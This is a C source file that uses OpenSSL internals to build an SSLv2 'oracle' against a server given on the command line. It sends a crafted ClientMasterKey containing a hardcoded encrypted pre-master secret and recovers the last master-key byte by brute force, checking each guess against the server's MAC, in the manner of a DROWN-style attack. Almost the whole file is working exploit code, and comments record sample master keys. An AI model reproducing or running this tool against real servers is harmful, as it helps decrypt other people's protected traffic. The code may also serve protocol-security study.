#include <assert.h>
#include <openssl/ssl.h>

#include "ssl_locl.h"

/*
 * Writes the message stored in the session buffer
 * to the BIO socket using a 2 byte header
 */
void ssl2_write_to_socket(SSL *s)
{
	unsigned char *buf = (unsigned char *)s->init_buf->data;
	unsigned int len = s->init_num;
	unsigned char *wbuf = (unsigned char *)s->s2->wbuf;

	// We only use two bytes header
	// No idea wtf happens here
	wbuf[0] = (len >> 8) | 0x80;
	wbuf[1] = len & 0xff;

	// Add our message
	memcpy(wbuf + 2, buf, len);

	// Send the message
	int sent_len = BIO_write(s->wbio, (char *)wbuf, len + 2);
}

/*
 * Reads from the BIO socket into the session buffer
 */
void ssl2_read_from_socket(SSL *s)
{
	unsigned char *pos = s->s2->rbuf;

	// Read from BIO socket
	unsigned int n = BIO_read(s->rbio, pos, SSL2_MAX_RECORD_LENGTH_2_BYTE_HEADER);

	// Read length
	// Remove padding
	s->s2->rlength=(((unsigned int)pos[0]) << 8) | ((unsigned int)pos[1]);

	// Check header length
	if ((pos[0] & TWO_BYTE_BIT))
	{
		s->s2->three_byte_header = 0;
		s->s2->rlength &= TWO_BYTE_MASK;
	}
	else
	{
		s->s2->three_byte_header = 1;
		s->s2->rlength &= THREE_BYTE_MASK;
	}
	pos += 2;

	// Read padding if any
	if (s->s2->three_byte_header)
		s->s2->padding = *(pos++);
	else
		s->s2->padding = 0;

	// Adjust fields if cleartext or not
	s->s2->mac_data = pos;
	s->s2->ract_data = pos;
	s->s2->ract_data_length = s->s2->rlength;

	// Separate MAC from actual data
	if (!s->s2->clear_text)
	{
		unsigned int mac_size = EVP_MD_CTX_size(s->read_hash);
		s->s2->ract_data += mac_size;
		s->s2->ract_data_length -= mac_size;
	}
}

/*
 * Sends an empty client handshake HELLO message
 */
void send_client_hello(SSL *s)
{
	unsigned char *buf = (unsigned char*)s->init_buf->data;
	unsigned char *pos = buf;
	unsigned char *data = pos + 9;
	int n;

	// MSG-CLIENT-HELLO message type
	*(pos++) = SSL2_MT_CLIENT_HELLO;

	// Add 2 bytes for SSL version
	s2n(SSL2_VERSION, pos);

	// Add cipher list to message
	// and get the length of the added data
	n = ssl_cipher_list_to_bytes(s, SSL_get_ciphers(s), data, 0);
	data += n;

	// Cipher specs length must be 2 bytes long
	s2n(n, pos);

	// Add 2 bytes for session ID
	s2n(0, pos);

	// Generate our challenge
	n = SSL2_CHALLENGE_LENGTH;
	s->s2->challenge_length = n;
	memset(s->s2->challenge, 0, n);

	// Add 2 bytes for challenge length
	s2n(n, pos);

	// We don't have an actual challenge
	// Fill out the rest of the message with NULL bytes
	memset(data, 0, n);
	data += n;

	// Total message size
	s->init_num = data - buf;

	// Write to socket
	ssl2_write_to_socket(s);
}

/*
 * Checks if the server HELLO message is valid
 */
int recv_server_hello(SSL *s)
{
	unsigned int n;
	unsigned char *pos, *data;

	ssl2_read_from_socket(s);

	pos = s->s2->ract_data;

	// Skip over header
	data = pos + 11;

	// Series of asserts to check if there were no handshake errors

	// Check that message type is MSG-SERVER-HELLO
	assert(*(pos++) == SSL2_MT_SERVER_HELLO);

	// Check session id
	assert(*(pos++) == 0);

	// Check if the certificate type is the one we want
	assert(*(pos++) == SSL2_CT_X509_CERTIFICATE);

	// Get SSL version and remove the padding
	unsigned int server_version;
	n2s(pos, server_version);

	// Check if server runs SSL2
	assert(server_version == SSL2_VERSION);

	// Get certificate length without padding
	n2s(pos, n);

	// We can skip over the certificate
	// because we don't care about it
	data += n;

	// Get cipher length
	n2s(pos, n);

	// Check if any ciphers were selected
	if (n == 0)
		return 0;

	// Get session ciphers
	s->session->cipher = s->method->get_cipher_by_char(data);
	assert(s->session->cipher != NULL);
	data += n;

	// Read connection ID length
	n2s(pos, n);
	s->s2->conn_id_length = n;

	// Read connection ID
	memcpy(s->s2->conn_id, data, n);

	return 1;
}

/*
 * Sends the master key guess to the server
 * master_key -> clear bytes of master key
 * clear_bytes -> number of clear bytes
 * encrypted_key -> encrypted pre master secret
 * encrypted_key_length -> length of the pre master secret
 */
void send_master_key_guess(SSL *s,
			unsigned char *master_key,
			unsigned int clear_bytes,
			unsigned char *encrypted_key,
			unsigned int encrypted_key_length)
{
	unsigned char *buf = (unsigned char *)s->init_buf->data;
	unsigned char *pos, *data;
	unsigned int n;
	const EVP_CIPHER *cipher;
	const EVP_MD *md;

	pos = buf;

	// Skip over header
	data = pos + 10;

	// Get cipher and hash method for the session
	ssl_cipher_get_evp(s->session, &cipher, &md, NULL, NULL, NULL);

	// Message type
	*(pos++) = SSL2_MT_CLIENT_MASTER_KEY;

	// Cipher type selected by server
	n = s->method->put_cipher_by_char(s->session->cipher, pos);
	pos += n;

	// Set required master key length
	s->session->master_key_length = EVP_CIPHER_key_length(cipher);

	// Set master key guess for the session
	memcpy(s->session->master_key, master_key, s->session->master_key_length);

	// Add number of clear bytes
	n = clear_bytes;
	s2n(n, pos);

	// Add clear key bytes
	memcpy(data, master_key, n);
	data += n;

	// Set encrypted key size in header
	n = encrypted_key_length;
	s2n(n, pos);

	// Add the pre master secret to the message
	memcpy(data, encrypted_key, n);
	data += n;

	// Set key IV as 0
	n = EVP_CIPHER_iv_length(cipher);
	s->session->key_arg_length = n;
	memset(s->session->key_arg, 0, n);

	// Set IV length
	s2n(n, pos);

	// Write key IV (only zeros)
	memset(data, 0, n);
	data += n;

	// Total message size
	s->init_num = data - buf;

	// Send message
	ssl2_write_to_socket(s);
}

/*
 * Receives the ServerVerify message from the server
 * and returns 1 if the master key guess was correct
 * or 0 otherwise.
 */
int recv_server_verify(SSL *ssl)
{
	int result;

	// Receive message from server
	// ssl2_read_from_socket(ssl);
	// printf("Reading done\n");

	// We use some internal SSL functions
	// So we need to set some additional parameters in
	// the SSL object
	ssl->s2->read_sequence = 1;
	ssl->s2->clear_text = 0;

	// Free the old encryption context
	EVP_CIPHER_CTX_free(ssl->enc_write_ctx);
	EVP_CIPHER_CTX_free(ssl->enc_read_ctx);
	ssl->enc_write_ctx = NULL;
	ssl->enc_read_ctx = NULL;

	// We create a new context using the master key guess
	assert(ssl2_enc_init(ssl, 1) == 1);

	// Save a temp copy of the received data
	// because decryption is done in place

	unsigned char *temp = malloc(ssl->s2->rlength);
	memcpy(temp, ssl->s2->mac_data, ssl->s2->rlength);

	// We decrypt the received data with the master key guess
	assert(ssl2_enc(ssl, 0) == 1);

	// Compute the mac of the received data using our key
	unsigned long mac_size = EVP_MD_CTX_size(ssl->read_hash);
	unsigned char *mac = malloc(mac_size);
	ssl2_mac(ssl, mac, 0);

	// If our guess was correct, then the key should match
	// with the one used by the server, so the macs should match
	result = CRYPTO_memcmp(mac, ssl->s2->mac_data, mac_size) == 0;

	// Copy back data
	memcpy(ssl->s2->mac_data, temp, ssl->s2->rlength);

	// Free memory
	free(temp);
	free(mac);

	return result;
}

int guess_master_key(SSL* ssl, unsigned char *res)
{
	// guess the last byte
    for(int c = 0; c < 256; c++)
    {
		printf("Trying for c = %x\n", c);
        ssl->session->master_key[ssl->session->master_key_length - 1] = (unsigned char)c;
        if(recv_server_verify(ssl))
        {
            *res = c;
            return 1;
        }
    }
    return 0;
}

int main(int argc, char **argv)
{
	int res;

	if (argc < 2)
	{
		printf("Usage: ./oracle host:port\n");
		return -1;
	}

	// Initialize OpenSSL
	SSL_library_init();
	SSL_load_error_strings();

	const SSL_METHOD *method = SSLv2_method();
	assert(method != NULL);

	// Get context
	SSL_CTX *ctx = SSL_CTX_new(method);
	assert(ctx != NULL);

	// Get a new SSL object
	SSL *ssl = SSL_new(ctx);
	assert(ssl != NULL);

	// Connect to SSL server
	BIO *server = BIO_new_connect(argv[1]);
	assert(server != NULL);

	res = BIO_do_connect(server);
	assert(res == 1);

	// Connect SSL with BIO
	SSL_set_bio(ssl, server, server);

	// Make a new SSL session
	// We have to do everything by hand
	ssl_get_new_session(ssl, 0);

	// Set cipers for the session
	// Suppose key len is 16 bytes
	// Found these by using 'openssl ciphers -v -ssl2'
	// SSL_set_cipher_list(ssl, "IDEA-CBC-MD5:RC2-CBC-MD5:RC4-MD5");
	SSL_set_cipher_list(ssl, "DES-CBC3-MD5");

	// Init socket buffer
	ssl->init_buf = BUF_MEM_new();
	BUF_MEM_grow(ssl->init_buf, SSL2_MAX_RECORD_LENGTH_3_BYTE_HEADER);

	// Start TLS handshake
	send_client_hello(ssl);
	if (!recv_server_hello(ssl))
	{
		printf("Cipher list is not supported\n");
		return -1;
	}

	// TODO add master key guess here
	// Needs encrypted key data in order to work
	// Master-Key: 38C5BB48DF4CE118A04F246B6F01BB48732F5D752A2AE894
	// unsigned char encrypted_key[256] = "\x5d\x8e\x44\xf7\x7b\x99\xd3\xa8\xbb\x28\x5c\x2e\x31\x4a\x4e\xf9" \
	// 									"\x55\xe5\x1a\xc3\x2b\xb3\x01\x0e\x26\x3b\x21\x07\x05\xce\x07\x45" \
	// 									"\x46\x12\x03\xd8\x47\x62\xfe\x1d\x1e\xaf\x9e\xba\xb4\xc0\xd3\x6b" \
	// 									"\xd3\x6c\xaa\x5e\xc8\x79\xe8\x3c\xef\x62\x10\xc0\x71\x14\x4e\x5b" \
	// 									"\x78\x7b\x4e\xa1\xc2\xc1\x3b\x6d\xc5\x1f\xf6\x22\x50\x42\x3d\x7b" \
	// 									"\xc3\x40\xfe\x1d\x09\x6a\xad\x0b\xaa\x6e\x8f\xf8\x1b\xfc\x9a\xb7" \
	// 									"\x2f\x37\x22\x67\x8e\xc6\x32\x6c\x27\x55\x34\xa3\xc7\x9b\x66\xbb" \
	// 									"\xfb\x46\x7b\xe9\xdb\x3d\xf5\x57\x85\x5a\xe8\xdf\xb2\x43\xa9\x5a" \
	// 									"\xa0\xd1\x7c\x43\x70\xb5\x76\x88\x10\xa9\x5c\x76\x58\xd3\xbe\xb8" \
	// 									"\xe8\x42\xa6\x84\x12\xe3\x24\xbd\xcc\x5b\x5f\x30\x73\xf0\xf7\x23" \
	// 									"\x57\x21\x98\x25\x4b\xd5\xda\xf4\xeb\x6a\x9d\x03\x67\x17\xc2\x78" \
	// 									"\x70\x30\x1d\x27\x02\x0f\xa3\x75\xb7\xeb\x90\xd1\x74\x9e\x83\xa7" \
	// 									"\x37\x0e\xba\xf9\xc8\x7d\x6f\x28\x96\x3d\x4c\xff\x72\x4f\x9a\xd7" \
	// 									"\x3f\x22\x64\x42\xdf\x47\x25\x03\x56\x10\x26\x5e\x0e\x7e\x1e\xa2" \
	// 									"\x59\x5d\x2a\xec\xa7\x17\x37\x6d\x0a\x36\x06\x61\xa6\xf7\x56\x62" \
	// 									"\x3f\xc2\xe9\xd0\xb7\x19\x66\xac\xbb\xbd\x8e\xd9\xcf\xcd\x42\xb9";

	// Master-Key: C5032E033360067CD8BEF29AFF375B63D0BD93AFBCD8C2F1
	unsigned char encrypted_key[256] = "\x01\xf4\x4a\xce\xa4\x10\x06\x32\xa9\xb4\x98\x2b\xd6\x67\x6f\x21" \
									"\xd8\xe9\xf4\xbc\x0f\x79\xaa\x3d\xf1\x4d\x76\x85\xe5\x91\xd3\xe9" \
									"\x29\x1f\xa5\x38\x6f\x20\x51\x78\xf7\x89\x3e\xd2\xb4\x79\x40\x42" \
									"\x43\x55\x0e\x7c\x19\xc3\x86\x67\x64\x40\xa6\xa1\x97\x48\xbb\xc1" \
									"\x1a\x4f\x93\x2f\x70\xe2\xe9\x4a\xa4\x0e\x3d\x39\xc2\xa7\x9d\xa9" \
									"\xa6\x0a\xa5\xc0\xf1\x23\x2f\xb0\x5c\x0d\x97\xe7\x24\x2d\x8d\x72" \
									"\xeb\xc7\xc9\x28\x6a\x30\xf2\xf1\xf7\x2b\x3e\x9f\xd1\xb2\x5b\xf7" \
									"\x78\x4e\x51\x85\x57\x51\x7b\x08\xd3\x75\x75\x3a\xf2\x57\x3d\x9b" \
									"\x57\xe6\xfa\xd7\x90\x01\x55\xed\xde\x38\xb6\xd8\x0c\xf6\xd5\x76" \
									"\x39\xf1\xfa\xf2\x22\x0f\x6d\x86\xdd\x1e\xfd\x28\xdc\xc7\x41\x7b" \
									"\x1f\xcc\xef\xf2\xaf\x6c\x48\x2d\x26\x7f\x6d\x48\x9f\x90\xd2\x4a" \
									"\x35\x4c\x35\x96\xbf\xae\xc3\xeb\x5f\x15\xe7\x69\xd4\x9d\x39\x5c" \
									"\xd9\xae\x28\x45\x5e\x8e\x52\xc3\x83\x05\xa9\x2f\x53\xb8\x69\xd7" \
									"\xcf\x3d\x8f\x66\x02\x1a\xae\x7d\xa9\xa5\x58\x12\x32\xb4\xc9\x8c" \
									"\x76\xc6\xdc\xa6\x0d\x22\x21\x48\xe3\x91\x9a\xbd\x23\x8d\x68\xe5" \
									"\xae\xec\xba\x5f\xe2\x8c\x86\xd0\xe3\x8b\x8b\x87\x9a\x66\xa9\x3d";

	unsigned char keysize = 24;
	unsigned char guess_array[keysize*2];
    memset(guess_array, 0, keysize*2);
    unsigned char *master_key_guess = guess_array;

	printf("Sending master key guess...\n");
	send_master_key_guess(ssl, master_key_guess, keysize - 1, encrypted_key, 256);
	printf("Master key guess sent!\n");
	ssl->s2->clear_text=0;
    assert(ssl2_enc_init(ssl, 1) == 1);
	ssl2_read_from_socket(ssl);
	printf("Reading done\n");

	// Get last byte
	printf("Guessing master key...\n");
	res = guess_master_key(ssl, &master_key_guess[keysize - 1]);
	printf("Done guessing! res = %d\n", res);

	if(!res)
	{
		return 0;
	}

	SSL_CTX_free(ssl->ctx);
	SSL_free(ssl);

	return 0;
}